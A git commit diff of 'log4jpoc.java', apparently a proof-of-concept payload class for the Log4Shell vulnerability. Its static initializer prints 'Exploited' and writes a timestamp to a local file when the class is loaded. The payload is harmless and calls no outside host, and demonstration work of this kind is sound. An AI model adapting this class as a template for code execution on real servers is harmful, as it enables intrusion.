8329ceac308d7ab3dce7ff0bb9456d9a7d12a464
ankur-katiyar <ankur.katiyar@gmail.com>
2021-12-16 18:00:36 -0500

    updates

--- log4jpoc.java
+++ log4jpoc.java
@@ -4,26 +4,31 @@ import java.io.FileWriter;
 import java.io.IOException;  // Import the IOException class to handle errors
 import java.sql.Timestamp;
 
+
 public class log4jpoc {
-  public static void main(String[] args) {
-    try {
-      File myObj = new File("testfile.txt");
-      Timestamp timestamp = new Timestamp(System.currentTimeMillis());
-      if (myObj.createNewFile()) {
-        System.out.println("File created: " + myObj.getName());
-        
-      } else {
-        System.out.println("File already exists, writing timestamp to it");
-        BufferedWriter out = new BufferedWriter(
-                new FileWriter("testfile.txt", true));
-        
-        out.write(timestamp+"\n");
-        out.newLine();
-        out.close();
-      }
-    } catch (IOException e) {
-      System.out.println("An error occurred.");
-      e.printStackTrace();
+    public log4jpoc() {}
+    static {
+        try {
+            System.out.println("Exploited");
+            File myObj = new File("testfile.txt");
+            Timestamp timestamp = new Timestamp(System.currentTimeMillis());
+            if (myObj.createNewFile()) {
+              System.out.println("File created: " + myObj.getName());
+              
+            } else {
+              System.out.println("File already exists, writing timestamp to it");
+              BufferedWriter out = new BufferedWriter(
+                      new FileWriter("testfile.txt", true));
+              
+              out.write(timestamp+"\n");
+              out.newLine();
+              out.close();
+            }
+        }catch (Exception e){
+            e.printStackTrace();
+        }
     }
-  }
+    public static void main(String[] args) {
+        log4jpoc e = new log4jpoc();
+    }
 }
